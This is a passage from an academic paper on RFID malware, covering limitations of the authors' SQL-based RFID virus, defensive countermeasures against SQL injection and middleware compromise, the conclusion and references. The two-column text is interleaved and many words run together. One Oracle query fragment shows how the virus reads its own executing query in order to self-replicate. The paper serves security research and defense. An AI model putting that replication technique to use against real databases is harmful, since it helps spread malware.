+                   the correct order. Note that this also will not work for              O’Reilly. Explicitly replicating single quotes, or es-
+                   RFID viruses, since the total contents are too large to               caping quotes with backslashes will not always help
+                   rewrite to a single RFID tag.                                         either, because quotes can be represented by Unicode
+                2. Quine generality issues. SQL is Structured Query                      andotherencodings. Itisbesttousebuilt-in“datasan-
+                   Language, not Standard Query Language. In other                       itizing” functions, like pg escape bytea() in Postgres
+                   words,SQLisnotSQLisnotSQL:differentdatabases                          andmysql real escape string() in MySQL.
+                   offer different variants and subsets of the SQL lan-               3. Disable back-end scripting languages. RFID mid-
+                   guage. This means that even quines written purely in                  dleware that uses HTTP can mitigate script injec-
+                   SQLcanstill be database speciﬁc. For this reason, the                 tion by eliminating scripting support from the HTTP
+                   example SQL quine from Section 5.3 only works on                      client. This may include turning off both client-side
+                   PostgreSQL and not on Oracle. This is due to vari-                    (i.e. Javascript, Java, VBScript, ActiveX, Flash) and
+                   ancesinSQLcommands–concat()vs. ||,charvs. chr,                        server-side languages (i.e. Server-Side Includes).
+                   etc.. This meansthatatrulyplatformindependentSQL                   4. Limit database permissions and segregate users.
+                   quinewouldneedtoavoidtheseplatform-speciﬁcSQL                         The database connection should use the most limited
+                   commands.                                                             rights possible. Tables should be made read-only or
+                3. Self-replication issues.     Utilizing the currently ex-              inaccessable, becausethis limits the damage causedby
+                   ecuting query for RFID virus self-replication only                    successful SQL injection attacks. It is also critical to
+                   works in certain circumstances.       MySQL’s “SHOW                   disable the execution of multiple SQL statements in a
+                   FULLPROCESSLIST”commandwon’treturnause-                               single query.
+                   able result set, outside the C API, and PostgreSQL                 5. Use parameter binding. Dynamically constructing
+                   also has a “reporting delay” which results in the cur-                SQL on-the-ﬂy is dangerous. Instead, it is better to
+                   rent query being speciﬁed as ’<IDLE>’.             On the             use stored procedures with parameter binding. Bound
+                   other hand, utilizing the currently executing query                   parameters (using the PREPARE statement) are not
+                   is not a problem with Oracle – “SELECT SUB-                           treated as a value, making SQL injection attacks more
+                   STR(SQL TEXT,43,127)FROM v$sql WHERE IN-                              difﬁcult.
+                   STR(SQL TEXT, ...payload...)>0)” works just ﬁne
+                   (assumingadministratorprivileges).                                 6. IsolatetheRFIDmiddlewareserver. Compromiseof
+                                                                                         the RFID middleware server should not automatically
+              7 Discussion                                                               grant full access to the rest of the back-end infrastruc-
+                                                                                         ture. Networkconﬁgurationsshouldthereforelimitac-
+                                                                                         cess to other servers using the usual mechanisms (i.e.
+                 Now that we have demonstrated how to exploit RFID                       DMZs)
+              middleware systems, it is important for RFID middlware                  7. Code review. RFID middleware source code is less
+              designers and administrators to understand how to prevent
+              andﬁxtheseproblems. Concernedparties can protect their                     likely to contain exploitable bugs if it is frequently
+              systems against RFID malware by taking the following                       scrutinized. “Home grown” RFID middleware should
+              steps[16]:                                                                 becriticallyaudited. Widelydistributedcommercialor
+                                                                                         open-sourceRFIDmiddlewaresolutionsarelesslikely
+                1. Bounds checking. Bounds checking is the means of                      to contain bugs.
+                   detecting whether or not an index lies within the limits            For more information about secure programming prac-
+                   of an array. It is usually performed by the compiler,            tices, see the books ’Secure Coding’[10], ’Building Se-
+                   so as not to induce runtime delays. Programming lan-             cure Software’[18], and ’Writing Secure Code’ (second
+                   guages that enforce run-time checking, like Ada, Vi-             edition)[12].
+                   sualBasic, Java, andC#,donotneedboundschecking.
+                   However,RFIDmiddlewarewritteninotherlanguages                    8 Conclusion
+                   should be compiled with bounds-checkingenabled.
+                2. Sanitize the input. Instead of explicitly stripping off             RFID malware threatens an entire class of Pervasive
+                   special characters, it is easier to only accept data that        Computing applications. Developers of the wide variety
+                  of RFID-enhanced systems will need to “armor” their sys-                                  [9] B. Fabian, O. Gunther¨      , and S. Spiekermann. Security anal-
+                  tems, to limit the damage that is caused once hackers start                                    ysis of the object name service for RFID. In Security, Pri-
+                  experimentingwithRFIDexploits,RFIDworms,andRFID                                                vacyandTrustinPervasiveandUbiquitousComputing,July
+                  viruses on a larger scale. This paper has underscoredthe ur-                                   2005.
+                  gency of taking these preventative measures by illustrating                             [10] M. G. Graff and K. R. Van Wyk. Secure Coding: Principles
+                  the general feasibility of RFID malware, and by presenting                                     and Practices. O’Reilly, 2003.
+                  the ﬁrst ever RFID virus.                                                               [11] D. R. Hofstadter. Godel, Escher, Bach: An Eternal Golden
+                      The spread of RFID malware may launch a new fron-                                          Braid. Basic Books, Inc., New York, NY, USA, 1979.
+                                                                                                          [12] M. Howard and D. LeBlanc. Writing Secure Code. Mi-
+                  tier of cat-and-mouseactivity, that will play out in the arena                                 crosoft Press, 2002.
+                  of RFID technology. RFID malware may cause other new                                    [13] N.      Jorgensen.             Self    documenting         program      in
+                  phenomenato appear; from RFID phishing (tricking RFID                                          SQL.                       http://www.droptable.com/
+                  reader owners into reading malicious RFID tags) to RFID                                        archive478-2005-5-25456.html.
+                  wardriving (searching for vulnerable RFID readers). Peo-                                [14] Z. Kﬁr and A. Wool. Picking virtual pockets using relay at-
+                  ple might even develop RFID honeypots to catch the RFID                                        tacks on contactless smartcard systems. In 1st Intl. Conf. on
+                  wardrivers! Each of these cases makes it increasingly obvi-                                    Security and Privacy for Emerging Areas in Communication
+                  ous that the age of RFID innocence has been lost. People                                       Networks, Sep 2005. http://eprint.iacr.org/.
+                  will never have the luxury of blindly trusting the data in                              [15] D.      Madore.            Quines      (self-replicating     programs).
+                                                                                                                 http://www.madore.org/˜david/computers/
+                  their cat again.                                                                               quine.html.
+                                                                                                          [16] D. Rajesh. Advanced concepts to prevent SQL injection.
+                  9 Acknowledgements                                                                             http://www.csharpcorner.com/UploadFile/
+                                                                                                                 rajeshdg/Page107142005052957AM/
+                      WewouldliketothankPatrickSimpsonforhistimeand                                              P%age1.aspx?ArticleID=
+                  energyspent on our RFID malware test platform.                                                 631d8221-64ed-4db7-b81b-8ba3082cb496.
+                      This work was supported by the Nederlandse Organ-                                   [17] M. R. Rieback, B. Crispo, and A. S. Tanenbaum. RFID
+                                                                                                                 Guardian: A battery-powered mobile device for RFID pri-
+                  isatie voor Wetenschappelijk Onderzoek(NWO), as project                                        vacy management. In Proc. 10th Australasian Conf. on In-
+                  #600.065.120.03N17.                                                                            formation Security and Privacy (ACISP 2005), volume 3574
+                                                                                                                 of LNCS, pages 184–194, July 2005.
+                  References                                                                              [18] J. Viega and G. McGraw. Building Secure Software: How
+                                                                                                                 to Avoid Security Problems the Right Way. Addison-Wesley
+                    [1] How to ﬁnd security holes. http://www.canonical.                                         Professional, 2001.
+                         org/˜kragen/security-holes.html.                                                 [19] N. Weaver, V. Paxson, S. Staniford, and R. Cunningham. A
+                    [2] How to prevent cross-site scripting security issues.                                     taxonomy of computer worms. In First Workshop on Rapid
+                         http://support.microsoft.com/default.                                                   Malcode (WORM),2003.
+                         aspx?scid=kb;en-us;Q252985.                                                      [20] M. Weiser.            The computer for the twenty-ﬁrst cen-
+                    [3] Wikipedia - buffer overﬂow. http://en.wikipedia.                                         tury.        Scientiﬁc     American,       pages     94–100,      1991.
+                         org/wiki/Buffer_overflow.                                                               http://www.ubiq.com/hypertext/weiser/
+                    [4] Biometrics deployment of machine readable travel doc-                                    SciAmDraft3.html.
+                         uments.        May 2004.            http://www.icao.int/
+                         mrtd/download/documents/Biometrics%
+                         20deployment%20o%f%20Machine%
+                         20Readable%20Travel%20Documents%202004.
+                         pdf.
+                    [5] C. Anley.       Advanced SQL injection in SQL Server ap-
+                         plications. http://www.nextgenss.com/papers/
+                         advanced_sql_injection.pdf.
+                    [6] Anonymous.              Rest    in   peace.         In    RFID Buzz.
+                         http://www.rfidbuzz.com/news/2005/rest_
+                         in_peace.html.
+                    [7] V. R. Basili and B. T. Perricone.               Software errors and
+                         complexity: An empirical investigation. Commun. ACM,
+                         27(1):42–52, 1984.
+                    [8] S. Bono, M. Green, A. Stubbleﬁeld, A. Juels, A. Rubin,
+                         and M. Szydlo. Security analysis of a cryptographically-
+                         enabled RFIDdevice. In 14th USENIXSecurity Symposium,
+                         pages 1–16, Baltimore, Maryland, USA, July-August 2005.
+                         USENIX.
